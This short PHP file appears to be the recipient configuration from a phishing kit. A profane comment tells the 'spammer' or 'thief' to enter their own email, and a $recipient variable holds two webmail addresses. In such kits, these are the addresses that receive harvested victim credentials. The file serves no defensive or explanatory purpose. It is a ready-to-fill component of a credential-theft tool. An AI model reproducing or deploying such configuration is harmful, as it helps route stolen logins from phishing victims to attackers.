<?php



//Hey u fucking spammer, put your fucking email here thief. I'm just kidding Lol.

$recipient = "ghostmode0003@yahoo.com,ghostmode005@aol.com"; 


?>